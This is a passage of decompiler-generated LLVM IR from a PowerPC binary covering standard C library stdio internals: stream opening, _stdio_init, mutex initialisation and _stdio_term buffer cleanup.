  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000d0a4 ], [ %v2_1000d094, %dec_label_pc_1000d094 ]
  %v0_1000d0a8 = phi i32 [ %tmp, %dec_label_pc_1000d0a4 ], [ %v2_1000d094, %dec_label_pc_1000d094 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000d0a8 = add i32 %v0_1000d0a8, 1
  %v2_1000d0a8 = inttoptr i32 %v1_1000d0a8 to i8*
  %v3_1000d0a8 = load i8, i8* %v2_1000d0a8, align 1
  %v4_1000d0a8 = zext i8 %v3_1000d0a8 to i32
  store i32 %v4_1000d0a8, i32* %r0.global-to-local, align 4
  %v3_1000d0ac = icmp eq i8 %v3_1000d0a8, 43
  br i1 %v3_1000d0ac, label %dec_label_pc_1000d0b4, label %dec_label_pc_1000d0bc

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d0a8
  store i32 %v0_1000d0b4, i32* %r9.global-to-local, align 4
  %v1_1000d0b8 = add nuw nsw i32 %v0_1000d0b4, 1
  store i32 %v1_1000d0b8, i32* @r28, align 4
  br label %dec_label_pc_1000d0bc

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d0a8, %dec_label_pc_1000d0b4
  %v3_1000d0bc = icmp eq i32 %v0_1000d038, 0
  br i1 %v3_1000d0bc, label %dec_label_pc_1000d0c4, label %dec_label_pc_1000d0ec

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d0bc
  store i32 80, i32* @r3, align 4
  store i32 268488908, i32* @lr, align 4
  %v0_1000d0c8 = call i32 @malloc()
  store i32 %v0_1000d0c8, i32* @r31, align 4
  %v4_1000d0cc = icmp eq i32 %v0_1000d0c8, 0
  store i1 %v4_1000d0cc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000d0cc, label %dec_label_pc_1000d2c8, label %dec_label_pc_1000d0d4

dec_label_pc_1000d0d4:                            ; preds = %dec_label_pc_1000d0c4
  %v1_1000d0d8 = add i32 %v0_1000d0c8, 56
  store i32 %v1_1000d0d8, i32* @r3, align 4
  %v3_1000d0dc = inttoptr i32 %v0_1000d0c8 to i16*
  store i16 8192, i16* %v3_1000d0dc, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d0e4 = load i32, i32* @r31, align 4
  %v2_1000d0e4 = add i32 %v1_1000d0e4, 8
  %v3_1000d0e4 = inttoptr i32 %v2_1000d0e4 to i32*
  store i32 0, i32* %v3_1000d0e4, align 4
  store i32 268488940, i32* @lr, align 4
  %v0_1000d0e8 = call i32 @__stdio_init_mutex()
  %v0_1000d0ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000d0ec

dec_label_pc_1000d0ec:                            ; preds = %dec_label_pc_1000d0bc, %dec_label_pc_1000d0d4
  %v0_1000d14c = phi i32 [ %v0_1000d03c, %dec_label_pc_1000d0bc ], [ %v0_1000d0ec.pre, %dec_label_pc_1000d0d4 ]
  %v1_1000d0ec = icmp slt i32 %v0_1000d14c, 0
  br i1 %v1_1000d0ec, label %dec_label_pc_1000d14c, label %dec_label_pc_1000d0f4

dec_label_pc_1000d0f4:                            ; preds = %dec_label_pc_1000d0ec
  %v1_1000d0f8 = add i32 %arg1, 1
  store i32 %v1_1000d0f8, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1000d100 = load i32, i32* @r31, align 4
  %v2_1000d100 = add i32 %v1_1000d100, 4
  %v3_1000d100 = inttoptr i32 %v2_1000d100 to i32*
  store i32 %v0_1000d14c, i32* %v3_1000d100, align 4
  %v0_1000d104 = load i32, i32* @r28, align 4
  %v1_1000d104 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000d104 = and i32 %v1_1000d104, %v0_1000d104
  %v1_1000d108 = add i32 %v2_1000d104, 1
  store i32 %v1_1000d108, i32* %r9.global-to-local, align 4
  %v1_1000d10c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d10c = and i32 %v1_1000d10c, %v1_1000d108
  store i32 %v2_1000d10c, i32* %r0.global-to-local, align 4
  %v4_1000d110 = icmp eq i32 %v2_1000d10c, %v1_1000d108
  br i1 %v4_1000d110, label %dec_label_pc_1000d118, label %dec_label_pc_1000d064

dec_label_pc_1000d118:                            ; preds = %dec_label_pc_1000d0f4
  %v2_1000d118 = sub i32 -1, %arg1
  %v3_1000d118 = and i32 %v0_1000d104, %v2_1000d118
  store i32 %v3_1000d118, i32* %r0.global-to-local, align 4
  %v1_1000d11c = and i32 %v3_1000d118, 1024
  store i32 %v1_1000d11c, i32* %r9.global-to-local, align 4
  %v3_1000d11c = icmp eq i32 %v1_1000d11c, 0
  store i1 %v3_1000d11c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000d11c, label %dec_label_pc_1000d140, label %dec_label_pc_1000d124

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000d118
  %v0_1000d124 = load i32, i32* @r29, align 4
  store i32 268489016, i32* @lr, align 4
  %v2_1000d134 = call i32 @__libc_fcntl(i32 %v0_1000d124, i32 4)
  %v3_1000d138 = icmp eq i32 %v2_1000d134, 0
  br i1 %v3_1000d138, label %dec_label_pc_1000d140, label %dec_label_pc_1000d064

dec_label_pc_1000d140:                            ; preds = %dec_label_pc_1000d124, %dec_label_pc_1000d118
  %v1_1000d140 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000d140, i32* %r0.global-to-local, align 4
  %v0_1000d144 = load i32, i32* @r28, align 4
  %v2_1000d144 = or i32 %v0_1000d144, %v1_1000d140
  store i32 %v2_1000d144, i32* @r28, align 4
  br label %dec_label_pc_1000d178

dec_label_pc_1000d14c:                            ; preds = %dec_label_pc_1000d0ec
  %v3_1000d14c = icmp eq i32 %v0_1000d14c, -1
  %v0_1000d15c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000d14c, label %dec_label_pc_1000d158, label %dec_label_pc_1000d154

dec_label_pc_1000d154:                            ; preds = %dec_label_pc_1000d14c
  %v1_1000d154 = or i32 %v0_1000d15c.pre, 65536
  store i32 %v1_1000d154, i32* @r28, align 4
  br label %dec_label_pc_1000d158

dec_label_pc_1000d158:                            ; preds = %dec_label_pc_1000d14c, %dec_label_pc_1000d154
  %v0_1000d15c = phi i32 [ %v1_1000d154, %dec_label_pc_1000d154 ], [ %v0_1000d15c.pre, %dec_label_pc_1000d14c ]
  store i32 438, i32* @r5, align 4
  store i32 268489068, i32* @lr, align 4
  %v2_1000d168 = call i32 @__libc_open(i32 %arg1, i32 %v0_1000d15c)
  %v1_1000d16c = icmp slt i32 %v2_1000d168, 0
  %v1_1000d170 = load i32, i32* @r31, align 4
  %v2_1000d170 = add i32 %v1_1000d170, 4
  %v3_1000d170 = inttoptr i32 %v2_1000d170 to i32*
  store i32 %v2_1000d168, i32* %v3_1000d170, align 4
  br i1 %v1_1000d16c, label %dec_label_pc_1000d078, label %dec_label_pc_1000d158.dec_label_pc_1000d178_crit_edge

dec_label_pc_1000d158.dec_label_pc_1000d178_crit_edge: ; preds = %dec_label_pc_1000d158
  %v0_1000d17c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000d178

dec_label_pc_1000d178:                            ; preds = %dec_label_pc_1000d158.dec_label_pc_1000d178_crit_edge, %dec_label_pc_1000d140
  %v0_1000d17c = phi i32 [ %v0_1000d17c.pre, %dec_label_pc_1000d158.dec_label_pc_1000d178_crit_edge ], [ %v2_1000d144, %dec_label_pc_1000d140 ]
  %v0_1000d178 = load i32, i32* @r31, align 4
  %v1_1000d178 = inttoptr i32 %v0_1000d178 to i16*
  %v2_1000d178 = load i16, i16* %v1_1000d178, align 2
  %v3_1000d178 = zext i16 %v2_1000d178 to i32
  store i32 %v3_1000d178, i32* %r0.global-to-local, align 4
  %v1_1000d17c = urem i32 %v0_1000d17c, 4
  store i32 %v1_1000d17c, i32* %r29.global-to-local, align 4
  %v1_1000d180 = call i32 @__asm_rlwinm(i32 %v0_1000d17c, i32 0, i32 21, i32 21)
  %v1_1000d184 = add nuw nsw i32 %v1_1000d17c, 1
  store i32 %v1_1000d184, i32* %r29.global-to-local, align 4
  %v1_1000d188 = call i32 @__asm_rlwinm(i32 %v3_1000d178, i32 0, i32 18, i32 18)
  store i32 %v1_1000d188, i32* %r0.global-to-local, align 4
  %v1_1000d18c = xor i32 %v1_1000d184, 3
  store i32 %v1_1000d18c, i32* %r29.global-to-local, align 4
  %v1_1000d190 = urem i32 %v1_1000d188, 65536
  store i32 %v1_1000d190, i32* %r9.global-to-local, align 4
  %v0_1000d194 = load i32, i32* @r28, align 4
  %v1_1000d194 = call i32 @__asm_rlwinm(i32 %v0_1000d194, i32 31, i32 16, i32 16)
  %v2_1000d198 = or i32 %v1_1000d194, %v1_1000d180
  store i32 %v2_1000d198, i32* %r0.global-to-local, align 4
  %v0_1000d19c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d19c = mul i32 %v0_1000d19c, 16
  %v0_1000d1a0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000d1a0 = or i32 %v0_1000d1a0, %v2_1000d198
  store i32 %v2_1000d1a0, i32* %r9.global-to-local, align 4
  %v2_1000d1a4 = or i32 %v2_1000d1a0, %v1_1000d19c
  store i32 %v2_1000d1a4, i32* @r29, align 4
  %v1_1000d1a8 = trunc i32 %v2_1000d1a4 to i16
  %v2_1000d1a8 = load i32, i32* @r31, align 4
  %v3_1000d1a8 = inttoptr i32 %v2_1000d1a8 to i16*
  store i16 %v1_1000d1a8, i16* %v3_1000d1a8, align 2
  %v0_1000d1ac = call i32 @__errno_location()
  store i32 %v0_1000d1ac, i32* @r28, align 4
  %v0_1000d1b4 = load i32, i32* @r31, align 4
  %v1_1000d1b4 = add i32 %v0_1000d1b4, 4
  %v2_1000d1b4 = inttoptr i32 %v1_1000d1b4 to i32*
  %v3_1000d1b4 = load i32, i32* %v2_1000d1b4, align 4
  %v1_1000d1b8 = inttoptr i32 %v0_1000d1ac to i32*
  %v2_1000d1b8 = load i32, i32* %v1_1000d1b8, align 4
  store i32 %v2_1000d1b8, i32* @r27, align 4
  store i32 268489152, i32* @lr, align 4
  %v1_1000d1bc = call i32 @isatty(i32 %v3_1000d1b4)
  %v1_1000d1c0 = mul i32 %v1_1000d1bc, 256
  %v0_1000d1c4 = load i32, i32* @r29, align 4
  %v2_1000d1c4 = or i32 %v0_1000d1c4, %v1_1000d1c0
  store i32 %v2_1000d1c4, i32* @r29, align 4
  %v1_1000d1c8 = trunc i32 %v2_1000d1c4 to i16
  %v2_1000d1c8 = load i32, i32* @r31, align 4
  %v3_1000d1c8 = inttoptr i32 %v2_1000d1c8 to i16*
  store i16 %v1_1000d1c8, i16* %v3_1000d1c8, align 2
  %v0_1000d1cc = load i32, i32* @r27, align 4
  %v1_1000d1cc = load i32, i32* @r28, align 4
  %v2_1000d1cc = inttoptr i32 %v1_1000d1cc to i32*
  store i32 %v0_1000d1cc, i32* %v2_1000d1cc, align 4
  %v0_1000d1d0 = load i32, i32* @r31, align 4
  %v1_1000d1d0 = add i32 %v0_1000d1d0, 8
  %v2_1000d1d0 = inttoptr i32 %v1_1000d1d0 to i32*
  %v3_1000d1d0 = load i32, i32* %v2_1000d1d0, align 4
  store i32 %v3_1000d1d0, i32* %r0.global-to-local, align 4
  %v3_1000d1d4 = icmp eq i32 %v3_1000d1d0, 0
  br i1 %v3_1000d1d4, label %dec_label_pc_1000d1dc, label %dec_label_pc_1000d20c

dec_label_pc_1000d1dc:                            ; preds = %dec_label_pc_1000d178
  store i32 4096, i32* @r3, align 4
  store i32 268489188, i32* @lr, align 4
  %v0_1000d1e0 = call i32 @malloc()
  %v3_1000d1e4 = icmp eq i32 %v0_1000d1e0, 0
  %v1_1000d1e8 = load i32, i32* @r31, align 4
  %v2_1000d1e8 = add i32 %v1_1000d1e8, 8
  %v3_1000d1e8 = inttoptr i32 %v2_1000d1e8 to i32*
  store i32 %v0_1000d1e0, i32* %v3_1000d1e8, align 4
  %v1_1000d208 = load i32, i32* @r31, align 4
  br i1 %v3_1000d1e4, label %dec_label_pc_1000d208, label %dec_label_pc_1000d1f0

dec_label_pc_1000d1f0:                            ; preds = %dec_label_pc_1000d1dc
  %v1_1000d1f0 = inttoptr i32 %v1_1000d208 to i16*
  %v2_1000d1f0 = load i16, i16* %v1_1000d1f0, align 2
  %v3_1000d1f0 = zext i16 %v2_1000d1f0 to i32
  store i32 %v3_1000d1f0, i32* %r0.global-to-local, align 4
  %v1_1000d1f4 = add i32 %v0_1000d1e0, 4096
  store i32 %v1_1000d1f4, i32* %r9.global-to-local, align 4
  %v2_1000d1f8 = add i32 %v1_1000d208, 12
  %v3_1000d1f8 = inttoptr i32 %v2_1000d1f8 to i32*
  store i32 %v1_1000d1f4, i32* %v3_1000d1f8, align 4
  %v0_1000d1fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d1fc = or i32 %v0_1000d1fc, 16384
  store i32 %v1_1000d1fc, i32* %r0.global-to-local, align 4
  %v1_1000d200 = trunc i32 %v1_1000d1fc to i16
  %v2_1000d200 = load i32, i32* @r31, align 4
  %v3_1000d200 = inttoptr i32 %v2_1000d200 to i16*
  store i16 %v1_1000d200, i16* %v3_1000d200, align 2
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d208:                            ; preds = %dec_label_pc_1000d1dc
  %v2_1000d208 = add i32 %v1_1000d208, 12
  %v3_1000d208 = inttoptr i32 %v2_1000d208 to i32*
  store i32 0, i32* %v3_1000d208, align 4
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d178, %dec_label_pc_1000d1f0, %dec_label_pc_1000d208
  %v0_1000d20c = load i32, i32* @r31, align 4
  %v1_1000d20c = inttoptr i32 %v0_1000d20c to i16*
  %v2_1000d20c = load i16, i16* %v1_1000d20c, align 2
  %v3_1000d20c = zext i16 %v2_1000d20c to i32
  store i32 %v3_1000d20c, i32* %r0.global-to-local, align 4
  %v1_1000d210 = add i32 %v0_1000d20c, 8
  %v2_1000d210 = inttoptr i32 %v1_1000d210 to i32*
  %v3_1000d210 = load i32, i32* %v2_1000d210, align 4
  store i32 %v3_1000d210, i32* %r9.global-to-local, align 4
  %v1_1000d214 = and i32 %v3_1000d20c, 8192
  %v3_1000d214 = icmp eq i32 %v1_1000d214, 0
  store i1 %v3_1000d214, i1* %cr0_eq.global-to-local, align 1
  %v3_1000d21c = add i32 %v0_1000d20c, 2
  %v4_1000d21c = inttoptr i32 %v3_1000d21c to i8*
  store i8 0, i8* %v4_1000d21c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000d224 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d224 = load i32, i32* @r31, align 4
  %v2_1000d224 = add i32 %v1_1000d224, 20
  %v3_1000d224 = inttoptr i32 %v2_1000d224 to i32*
  store i32 %v0_1000d224, i32* %v3_1000d224, align 4
  %v0_1000d228 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d228 = load i32, i32* @r31, align 4
  %v2_1000d228 = add i32 %v1_1000d228, 24
  %v3_1000d228 = inttoptr i32 %v2_1000d228 to i32*
  store i32 %v0_1000d228, i32* %v3_1000d228, align 4
  %v0_1000d22c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d22c = load i32, i32* @r31, align 4
  %v2_1000d22c = add i32 %v1_1000d22c, 28
  %v3_1000d22c = inttoptr i32 %v2_1000d22c to i32*
  store i32 %v0_1000d22c, i32* %v3_1000d22c, align 4
  %v0_1000d230 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d230 = load i32, i32* @r31, align 4
  %v2_1000d230 = add i32 %v1_1000d230, 16
  %v3_1000d230 = inttoptr i32 %v2_1000d230 to i32*
  store i32 %v0_1000d230, i32* %v3_1000d230, align 4
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v0_1000d238 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d238 = load i32, i32* @r31, align 4
  %v2_1000d238 = add i32 %v1_1000d238, 44
  %v3_1000d238 = inttoptr i32 %v2_1000d238 to i32*
  store i32 %v0_1000d238, i32* %v3_1000d238, align 4
  %v3_1000d23c = load i32, i32* @global_var_100287bc.613, align 4
  store i32 %v3_1000d23c, i32* %r0.global-to-local, align 4
  %v1_1000d240 = load i32, i32* @r31, align 4
  %v2_1000d240 = add i32 %v1_1000d240, 52
  %v3_1000d240 = inttoptr i32 %v2_1000d240 to i32*
  store i32 %v3_1000d23c, i32* %v3_1000d240, align 4
  %v0_1000d244 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000d244, label %dec_label_pc_1000d2c8, label %dec_label_pc_1000d248

dec_label_pc_1000d248:                            ; preds = %dec_label_pc_1000d20c
  store i32 ptrtoint ([3 x i8]* @global_var_1001104c.607 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10028478.608 to i32), i32* %r29.global-to-local, align 4
  %v2_1000d258 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000d258, i32* @r26, align 4
  store i32 %v2_1000d258, i32* @r3, align 4
  %v0_1000d268 = call i32 @__pthread_return_void()
  %v2_1000d274 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000d274, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10028460.614 to i32), i32* @r29, align 4
  %v0_1000d27c = call i32 @__pthread_return_0()
  store i32 %v2_1000d274, i32* @r3, align 4
  %v0_1000d28c = call i32 @__pthread_return_void()
  %v0_1000d294 = call i32 @__pthread_return_0()
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000d29c = load i32, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  store i32 %v3_1000d29c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d274, i32* @r3, align 4
  %v1_1000d2a8 = load i32, i32* @r31, align 4
  %v2_1000d2a8 = add i32 %v1_1000d2a8, 32
  %v3_1000d2a8 = inttoptr i32 %v2_1000d2a8 to i32*
  store i32 %v3_1000d29c, i32* %v3_1000d2a8, align 4
  %v0_1000d2ac = load i32, i32* @r31, align 4
  store i32 %v0_1000d2ac, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  %v0_1000d2b0 = call i32 @__pthread_return_void()
  store i32 %v2_1000d258, i32* @r3, align 4
  %v0_1000d2bc = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000d2c8

dec_label_pc_1000d2c4:                            ; preds = %dec_label_pc_1000d078, %dec_label_pc_1000d064, %dec_label_pc_1000d084
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000d2c8

dec_label_pc_1000d2c8:                            ; preds = %dec_label_pc_1000d20c, %dec_label_pc_1000d0c4, %dec_label_pc_1000d248, %dec_label_pc_1000d2c4
  store i32 %v0_1000d024, i32* %r0.global-to-local, align 4
  %v0_1000d2cc = load i32, i32* @r31, align 4
  ret i32 %v0_1000d2cc

; uselistorder directives
  uselistorder i32 %v1_1000d208, { 2, 0, 1 }
  uselistorder i32 %v0_1000d17c, { 1, 0 }
  uselistorder i32 %v0_1000d0c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000d0b4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3, 4 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000d2c8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d2c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d20c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d158, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d094, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268632064, i32* @r28, align 4
  %v0_1000d2f4 = call i32 @__errno_location()
  store i32 %v0_1000d2f4, i32* @r26, align 4
  %v1_1000d300 = inttoptr i32 %v0_1000d2f4 to i32*
  %v2_1000d300 = load i32, i32* %v1_1000d300, align 4
  store i32 %v2_1000d300, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10028490.310 to i32), i32* @r27, align 4
  %v3_1000d308 = load i16, i16* @global_var_10028490.310, align 2
  %v4_1000d308 = zext i16 %v3_1000d308 to i32
  store i32 %v4_1000d308, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000d310.617 to i32), i32* @lr, align 4
  %v1_1000d30c = call i32 @isatty(i32 0)
  %v1_1000d310 = sub i32 1, %v1_1000d30c
  %v1_1000d314 = mul i32 %v1_1000d310, 256
  %v0_1000d318 = load i32, i32* @r29, align 4
  %v2_1000d318 = xor i32 %v1_1000d314, %v0_1000d318
  %v1_1000d320 = trunc i32 %v2_1000d318 to i16
  store i16 %v1_1000d320, i16* @global_var_10028490.310, align 2
  %v3_1000d324 = load i16, i16* @global_var_100284e0.311, align 2
  %v4_1000d324 = zext i16 %v3_1000d324 to i32
  store i32 %v4_1000d324, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000d32c.618 to i32), i32* @lr, align 4
  %v1_1000d328 = call i32 @isatty(i32 1)
  %v1_1000d32c = sub i32 1, %v1_1000d328
  %v1_1000d330 = mul i32 %v1_1000d32c, 256
  %v0_1000d334 = load i32, i32* @r29, align 4
  %v2_1000d334 = xor i32 %v1_1000d330, %v0_1000d334
  %v1_1000d338 = trunc i32 %v2_1000d334 to i16
  store i16 %v1_1000d338, i16* @global_var_100284e0.311, align 2
  %v0_1000d33c = load i32, i32* @r25, align 4
  %v1_1000d33c = load i32, i32* @r26, align 4
  %v2_1000d33c = inttoptr i32 %v1_1000d33c to i32*
  store i32 %v0_1000d33c, i32* %v2_1000d33c, align 4
  ret i32 %v1_1000d330

; uselistorder directives
  uselistorder i32 %v1_1000d330, { 1, 0 }
  uselistorder i16* @global_var_100284e0.311, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001718c.619 to i32), i32* @r4, align 4
  %v0_1000d360 = call i32 @memcpy()
  ret i32 %v0_1000d360
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10028460.614 to i32), i32* @r3, align 4
  store i32 268489600, i32* @lr, align 4
  %v0_1000d37c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10028478.608 to i32), i32* @r3, align 4
  store i32 268489612, i32* @lr, align 4
  %v0_1000d388 = call i32 @__stdio_init_mutex()
  store i32 268632064, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000d3d49 = icmp eq i32 %storemerge6, 0
  %v1_1000d3d811 = add i32 %storemerge6, 56
  store i32 %v1_1000d3d811, i32* %r30.global-to-local, align 4
  br i1 %v3_1000d3d49, label %dec_label_pc_1000d3e4, label %dec_label_pc_1000d398

dec_label_pc_1000d398:                            ; preds = %entry, %dec_label_pc_1000d3c4
  %v0_1000d398 = call i32 @__pthread_return_0()
  %v3_1000d39c = icmp eq i32 %v0_1000d398, 0
  %v0_1000d3a0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000d3a0, i32* @r3, align 4
  br i1 %v3_1000d39c, label %dec_label_pc_1000d3c4, label %dec_label_pc_1000d3a8

dec_label_pc_1000d3a8:                            ; preds = %dec_label_pc_1000d398
  %v0_1000d3a8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d3a8 = add i32 %v0_1000d3a8, 8
  %v2_1000d3a8 = inttoptr i32 %v1_1000d3a8 to i32*
  %v3_1000d3a8 = load i32, i32* %v2_1000d3a8, align 4
  store i32 %v3_1000d3a8, i32* %r9.global-to-local, align 4
  %v3_1000d3b0 = inttoptr i32 %v0_1000d3a8 to i16*
  store i16 48, i16* %v3_1000d3b0, align 2
  %v0_1000d3b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d3b4 = add i32 %v1_1000d3b4, 20
  %v3_1000d3b4 = inttoptr i32 %v2_1000d3b4 to i32*
  store i32 %v0_1000d3b4, i32* %v3_1000d3b4, align 4
  %v0_1000d3b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d3b8 = add i32 %v1_1000d3b8, 24
  %v3_1000d3b8 = inttoptr i32 %v2_1000d3b8 to i32*
  store i32 %v0_1000d3b8, i32* %v3_1000d3b8, align 4
  %v0_1000d3bc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3bc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d3bc = add i32 %v1_1000d3bc, 28
  %v3_1000d3bc = inttoptr i32 %v2_1000d3bc to i32*
  store i32 %v0_1000d3bc, i32* %v3_1000d3bc, align 4
  %v0_1000d3c0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d3c0 = add i32 %v1_1000d3c0, 16
  %v3_1000d3c0 = inttoptr i32 %v2_1000d3c0 to i32*
  store i32 %v0_1000d3c0, i32* %v3_1000d3c0, align 4
  br label %dec_label_pc_1000d3c4

dec_label_pc_1000d3c4:                            ; preds = %dec_label_pc_1000d398, %dec_label_pc_1000d3a8
  %v1_1000d3c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d3c8 = add i32 %v1_1000d3c8, 52
  %v3_1000d3c8 = inttoptr i32 %v2_1000d3c8 to i32*
  store i32 1, i32* %v3_1000d3c8, align 4
  store i32 268489680, i32* @lr, align 4
  %v0_1000d3cc = call i32 @__stdio_init_mutex()
  %v0_1000d3d0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d3d0 = add i32 %v0_1000d3d0, 32
  %v2_1000d3d0 = inttoptr i32 %v1_1000d3d0 to i32*
  %storemerge = load i32, i32* %v2_1000d3d0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000d3d4 = icmp eq i32 %storemerge, 0
  %v1_1000d3d8 = add i32 %storemerge, 56
  store i32 %v1_1000d3d8, i32* %r30.global-to-local, align 4
  br i1 %v3_1000d3d4, label %dec_label_pc_1000d3d4.dec_label_pc_1000d3e4_crit_edge, label %dec_label_pc_1000d398

dec_label_pc_1000d3d4.dec_label_pc_1000d3e4_crit_edge: ; preds = %dec_label_pc_1000d3c4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_100287b8.615 to i32*), align 4
  br label %dec_label_pc_1000d3e4

dec_label_pc_1000d3e4:                            ; preds = %dec_label_pc_1000d3d4.dec_label_pc_1000d3e4_crit_edge, %entry
  %v0_1000d42016 = phi i32 [ %v1_1000d3d8, %dec_label_pc_1000d3d4.dec_label_pc_1000d3e4_crit_edge ], [ %v1_1000d3d811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000d3d4.dec_label_pc_1000d3e4_crit_edge ], [ 0, %entry ]
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000d4085 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000d4085, label %dec_label_pc_1000d410, label %dec_label_pc_1000d3f0

dec_label_pc_1000d3f0:                            ; preds = %dec_label_pc_1000d3e4, %dec_label_pc_1000d404
  %v0_1000d3f0 = phi i32 [ %storemerge1, %dec_label_pc_1000d404 ], [ %storemerge12, %dec_label_pc_1000d3e4 ]
  %v1_1000d3f0 = inttoptr i32 %v0_1000d3f0 to i16*
  %v2_1000d3f0 = load i16, i16* %v1_1000d3f0, align 2
  %v3_1000d3f0 = zext i16 %v2_1000d3f0 to i32
  store i32 %v0_1000d3f0, i32* @r3, align 4
  %v1_1000d3f8 = and i32 %v3_1000d3f0, 64
  store i32 %v1_1000d3f8, i32* %r9.global-to-local, align 4
  %v3_1000d3f8 = icmp eq i32 %v1_1000d3f8, 0
  br i1 %v3_1000d3f8, label %dec_label_pc_1000d404, label %dec_label_pc_1000d400

dec_label_pc_1000d400:                            ; preds = %dec_label_pc_1000d3f0
  store i32 268489732, i32* @lr, align 4
  %v0_1000d400 = call i32 @__stdio_wcommit()
  %v0_1000d404.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d404

dec_label_pc_1000d404:                            ; preds = %dec_label_pc_1000d3f0, %dec_label_pc_1000d400
  %v0_1000d404 = phi i32 [ %v0_1000d3f0, %dec_label_pc_1000d3f0 ], [ %v0_1000d404.pre, %dec_label_pc_1000d400 ]
  %v0_1000d42017 = phi i32 [ %v0_1000d3f0, %dec_label_pc_1000d3f0 ], [ %v0_1000d400, %dec_label_pc_1000d400 ]
  %v1_1000d404 = add i32 %v0_1000d404, 32
  %v2_1000d404 = inttoptr i32 %v1_1000d404 to i32*
  %storemerge1 = load i32, i32* %v2_1000d404, align 4
  store i32 %storemerge1, i32* @r31, align 4
